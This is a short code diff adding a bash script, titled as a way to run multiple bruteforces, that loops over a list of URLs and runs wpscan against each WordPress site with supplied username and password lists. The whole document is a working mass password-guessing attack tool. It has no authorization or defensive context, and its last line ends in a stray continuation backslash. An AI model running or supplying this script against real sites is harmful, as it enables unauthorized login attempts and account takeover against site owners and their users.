@@ -1,0 +1,13 @@
+
+
+=========Create sh to run multiple bruteforces=======
+#!/bin/bash
+
+for url in $(cat urls.txt); do
+  echo "[*] Scanning: $url"
+  wpscan --url "http://$url" \
+    --usernames usernames.txt \
+    --passwords passwords.txt \
+    --max-threads 5 \
+
+done
